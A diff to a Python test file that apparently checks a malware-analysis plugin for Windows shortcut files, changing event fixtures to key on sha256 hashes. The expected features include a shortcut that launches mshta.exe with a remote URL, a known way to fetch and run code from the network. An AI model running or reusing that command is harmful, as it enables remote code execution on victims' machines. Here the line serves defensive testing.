@@ -33,8 +33,7 @@ class TestExecute(test_template.TestPlugin):
                 state=State(State.Label.COMPLETED),
                 events=[
                     Event(
-                        entity_type="binary",
-                        entity_id="7ccb8a50afa675bcba87788d7364db5a037ba507cafbe3ec5c802563f4cb505a",
+                        sha256="7ccb8a50afa675bcba87788d7364db5a037ba507cafbe3ec5c802563f4cb505a",
                         features={
                             "link_base_path": [FV(Filepath("C:\\WINDOWS\\system32\\cmd.exe"))],
                             "link_command_args": [
@@ -103,8 +102,7 @@ class TestExecute(test_template.TestPlugin):
                 state=State(State.Label.COMPLETED),
                 events=[
                     Event(
-                        entity_type="binary",
-                        entity_id="2589167e23bc288f04c3bd3cf735c4df52bad4633d20c94ebaff12f99405eccd",
+                        sha256="2589167e23bc288f04c3bd3cf735c4df52bad4633d20c94ebaff12f99405eccd",
                         features={
                             "link_base_path": [FV(Filepath("C:\\Windows\\System32\\mshta.exe"))],
                             "link_command_args": [FV("http://inform.bounceme.net/spool/index.html /f")],
